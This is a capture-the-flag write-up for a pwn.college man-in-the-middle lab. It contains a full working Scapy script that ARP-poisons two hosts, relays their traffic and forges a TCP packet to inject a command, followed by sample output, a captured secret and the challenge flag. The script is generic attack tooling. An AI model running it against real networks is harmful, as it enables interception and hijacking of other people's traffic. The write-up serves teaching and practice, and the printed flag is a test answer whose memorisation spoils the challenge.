---
layout: page
title: "🕵️‍♂️ Man-in-the-Middle – Writeup (pwn.college)"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 📌 Challenge Description

> Man-in-the-middle traffic from a remote host.  
> The remote host at `10.0.0.2` is communicating with the remote host at `10.0.0.3` on port `31337`.  
> Your task is to **perform a MitM attack**, observe the communication, and extract the flag.

---

## 🧠 Objective

- You are `10.0.0.1` and **not part of** the default communication path.
- The traffic between `.2` and `.3` is **not visible** to you initially.
- You must **intercept**, **relay**, and even **inject** traffic to trick the client into revealing the flag.

---

## 🔧 Solution Strategy

1. **ARP Spoof both .2 and .3** so they think you're the other host.
2. **Relay the traffic** between them to keep communication alive.
3. **Inject `flag`** in response to `command: ` prompt coming from the server.
4. **Capture the flag** as it flows back from the server.

---

## 🛠️ Implementation – `mitm.py`

```python
from scapy.all import *
import threading
import signal
import time
import os

# Network details
iface = "eth0"
client_ip = "10.0.0.2"
server_ip = "10.0.0.3"
target_port = 31337

# Get MAC addresses
def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for s, r in ans:
        return r.hwsrc
    return None

client_mac = get_mac(client_ip)
server_mac = get_mac(server_ip)
mitm_mac = get_if_hwaddr(iface)

if not all([client_mac, server_mac, mitm_mac]):
    print("[!] MAC address discovery failed.")
    exit(1)

print(f"[i] Client MAC: {client_mac}")
print(f"[i] Server MAC: {server_mac}")
print(f"[i] MITM MAC  : {mitm_mac}")

# ARP poisoning
def arp_poison():
    print("[*] Starting ARP poisoning...")
    while True:
        send(ARP(op=2, pdst=client_ip, psrc=server_ip, hwdst=client_mac), verbose=0)
        send(ARP(op=2, pdst=server_ip, psrc=client_ip, hwdst=server_mac), verbose=0)
        time.sleep(2)

# Restore ARP tables
def restore_arp():
    print("\n[*] Restoring ARP tables...")
    send(ARP(op=2, pdst=client_ip, psrc=server_ip, hwsrc=server_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=0)
    send(ARP(op=2, pdst=server_ip, psrc=client_ip, hwsrc=client_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=0)

# Main relay + injection function
def relay_and_inject(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return

    ip = pkt[IP]
    tcp = pkt[TCP]
    payload = pkt[Raw].load if pkt.haslayer(Raw) else b""

    # Live monitoring
    if payload:
        print(f"[{ip.src} → {ip.dst}] {payload!r}")

    # Injection logic
    if ip.src == server_ip and ip.dst == client_ip and b"command: " in payload:
        print("[!] Detected 'command: ', injecting 'flag'...")

        forged_ip = IP(src=client_ip, dst=server_ip)
        forged_tcp = TCP(
            sport=tcp.dport,
            dport=tcp.sport,
            seq=tcp.ack,
            ack=tcp.seq + len(payload),
            flags="PA"
        )
        forged_payload = Raw(load=b"flag")
        forged_eth = Ether(src=client_mac, dst=server_mac)

        packet = forged_eth / forged_ip / forged_tcp / forged_payload
        sendp(packet, iface=iface, verbose=0)
        print("[+] Injected forged 'flag' packet.")

        return  # Do not forward the original "command: " to client

    # Forwarding packets
    if ip.src == client_ip and ip.dst == server_ip:
        ether = Ether(src=mitm_mac, dst=server_mac)
    elif ip.src == server_ip and ip.dst == client_ip:
        ether = Ether(src=mitm_mac, dst=client_mac)
    else:
        return

    forward_packet = ether / pkt[IP]
    sendp(forward_packet, iface=iface, verbose=0)

# Handle Ctrl+C
def cleanup(sig, frame):
    restore_arp()
    os._exit(0)

# Start everything
signal.signal(signal.SIGINT, cleanup)
threading.Thread(target=arp_poison, daemon=True).start()

print("[*] Sniffing & relaying traffic... Press Ctrl+C to stop.\n")
sniff(iface=iface, prn=relay_and_inject, filter=f"tcp port {target_port}")
```
### Sample Output
```bash
[i] Client MAC: 2e:e3:f5:4d:5d:ee
[i] Server MAC: b6:2c:5c:8b:b4:44
[i] MITM MAC  : 1e:b2:f9:ed:a8:43
[*] Starting ARP poisoning...
[*] Sniffing & relaying traffic... Press Ctrl+C to stop.

[10.0.0.3 → 10.0.0.2] b'secret: '
[10.0.0.2 → 10.0.0.3] b'220894019aa5f407e6b346e5da8846b547828bff36cf7fc7f2cb2c529e88946b'
[10.0.0.3 → 10.0.0.2] b'command: '
[!] Detected 'command: ', injecting 'flag'...
[+] Injected forged 'flag' packet.
[10.0.0.2 → 10.0.0.3] b'flag'
[10.0.0.3 → 10.0.0.2] b'pwn.college{A0vbTQFwzpdP8HgUNl1wIFhy6gM.QXyczMzwSM0IzMyEzW}\n'
```

---
## Flag

```bash
pwn.college{A0vbTQFwzpdP8HgUNl1wIFhy6gM.QXyczMzwSM0IzMyEzW}
```
---
